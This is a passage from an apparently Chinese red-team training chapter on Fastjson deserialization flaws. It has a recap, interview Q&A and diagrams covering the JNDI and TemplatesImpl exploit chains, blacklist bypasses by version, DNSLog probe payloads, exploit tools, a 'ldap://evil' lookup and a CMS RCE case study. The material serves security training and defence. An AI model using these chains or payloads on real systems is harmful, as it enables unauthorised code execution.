3. **1.2.24经典链**：`JdbcRowSetImpl` + setAutoCommit(true) → 触发 lookup → JNDI RCE
4. **TemplatesImpl本地链**：注入 _bytecodes 字节码 → 不需要目标出网
5. **1.2.47 Bypass大法**：用 `java.lang.Class` 缓存危险类 → 黑名单形同虚设
6. **实战三板斧**：先DNSLog测是否出网 → 出网用JNDI / 不出网试本地链 → 工具直接打！

### 面试高频题 ❓（面试前必背）

- Q: Fastjson 1.2.24 和 1.2.47 的区别？
  A: 1.2.24直接用@type写危险类；1.2.25起加了黑名单和关闭AutoType，1.2.47用Class缓存绕过黑名单

- Q: JNDI注入的限制？
  A: 目标要能出网 + JDK 8u191+默认禁止远程类加载（需要找bypass）

- Q: 目标不出网怎么办？
  A: TemplatesImpl 字节码注入链 / CommonsBeanutils 本地链 / MySQL JDBC 反序列化链

Fastjson专题就讲到这里！下一章我们要讲另一个**护网红队最爱的框架级漏洞——Shiro反序列化漏洞！** 从rememberMe Cookie的加密原理讲起，到AES密钥爆破、Padding Oracle攻击、Cookie伪造一条龙，全是实战干货，我们不见不散！🔥

---

> 💡 新手小提示：
> 1. Fastjson环境搭不好？直接用Vulhub！一行docker-compose起环境
> 2. 别自己手写Payload，用工具生成！手工写容易写错编码
> 3. 永远在授权靶场练习，别去打真实系统！🚫

---

# 🖼️ 本章拓展图解汇总（day-40 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gmn8o6pil" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gmn8o6pil)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚡ Fastjson 版本漏洞对应表</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.24 首发@type RCE</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.25 AutoType默认关+黑名单</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.41 L开头大写绕过</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.42 [ 数组前缀绕过</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.47 Class缓存绕过</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.68 SafeMode加固</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gz6cm6lj9" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gz6cm6lj9)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 @type 反序列化核心原理</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">parseObject(json, Object.class)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">识别 @type 全限定类名</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Class.forName 动态加载类</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">newInstance 实例化对象</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">递归调用所有 setter 注入</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gr8diyp2v" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gr8diyp2v)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b91c1c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔗 JdbcRowSetImpl 触发链路</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">@type: JdbcRowSetImpl</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">setDataSourceName("ldap://evil")</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">setAutoCommit(true) 触发</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">this.dataSource.getConnection()</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">InitialContext.lookup(ldap)</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gzcumwvi2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gzcumwvi2)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f766e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧪 1.2.24 三条利用链对比</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链1 JNDI远程链 JdbcRowSetImpl</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链2 本地字节码 TemplatesImpl</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链3 本地集合 PriorityQueue</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链1需出网/JNDI服务</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链2/3本地无需出网</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g64vupe4z" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g64vupe4z)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📚 TemplatesImpl 字节码原理</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">_bytecodes: 存恶意class字节[]</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">_name: 非空 通过校验</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">_tfactory: TransformerFactory</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">getOutputProperties() 被调用</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">newTransformer() 触发 defineClass</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g1n047gtw" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g1n047gtw)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e3a8a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 1.2.25 AutoType安全机制</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">autoTypeSupport = false 默认关</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">denyList 100+ 危险类前缀</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">全限定名 startsWith 匹配</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">com.sun/org.apache 开头拦截</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">黑名单 vs 绕过 演化史</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gmfx4wr9q" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gmfx4wr9q)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7f1d1d" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛞 1.2.47 缓存Bypass核心</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">@type: java.lang.Class</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">val: "JdbcRowSetImpl"</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">TypeUtils.loadClass 加载并放入缓存</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">后续再次 @type JdbcRowSetImpl</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">缓存命中 绕过AutoType检查</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gkary7797" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gkary7797)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🚧 1.2.68+ SafeMode 安全架构</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">safeMode=true 白模式</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">全局禁用 @type 自动类型</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">关闭AutoType功能</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">完全禁止任意类反序列化</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">性能+安全双优 推荐开启</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gnywov79m" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gnywov79m)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#155e75" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 Fastjson 指纹识别5法</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Header/Body 探测 set-cookie 模式</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">X-Api-Version 返回 Fastjson 字样</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">异常时 JSONException 堆栈</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Accept: application/json → Content-Type匹配</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Server中间件 + Content-Type</text>
</svg>

<svg width="800" height="163" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 163">
  <defs><linearGradient id="g65qljakx" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="163" rx="12" fill="url(#g65qljakx)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📡 DNSLog 无回显检测Payload</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">{"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"}</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">{"@type":"java.net.InetSocketAddress"{"address":,"val":"x.dns"}}</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gutx3gyuf" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gutx3gyuf)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#422006" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 实战工具链矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDI-Injection-Exploit-1.0</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDIExploit 1.2/1.4</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">fastjson-scan-demo</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Burp FastjsonScan 插件</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei fastjson templates</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">python3 fastjson_rce.py</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gp2z3yfvp" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gp2z3yfvp)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#075985" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ JDK版本 vs 利用成功率</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 6/7u21早期 100%成功</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u121- RMI失效 LDAP OK</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u191+ 远程码加载失效→本地链</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 11+ 需 Groovy/TomcatEL本地链</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">高版本本地链成功率下降</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g87bbc19j" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g87bbc19j)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧩 CommonsBeanutils1 本地链</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PriorityQueue 作为容器</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">BeanComparator.compare() 排序调用</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">TemplatesImpl.getOutputProperties()</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">defineClass 加载 _bytecodes</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">全程本地 无需目标出网</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g9ciwv7f1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g9ciwv7f1)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚔️ Fastjson 绕过史 1.2.25~1.2.80</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.41 Lcom/xxx/YY 类路径大写绕过</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.42 [Lcom.xxx.YY; 数组前缀</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.47 java.lang.Class 缓存污染</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.68前 SafeMode关 仍可绕</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.83后 安全加固 绕法极少</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gmokkdibk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gmokkdibk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📖 报错信息回显识别</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">syntaxError: expect 语法错</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">autoType is not support 被拦</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">not close json 引号不配对</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">was class java.lang.String 类型不对</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">cannot be cast to xxx 类转换错</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gku4qkxxm" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gku4qkxxm)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔬 实战案例：某CMS登录口</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">某开源CMS /api/login 接口</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Content-Type: application/json 提交</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">DNSLog盲打 → 命中 dnslog请求</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK版本 8u171 → LDAP OK</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDI Exploit 一键 RCE 上线</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gbjalj0sh" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gbjalj0sh)"/>
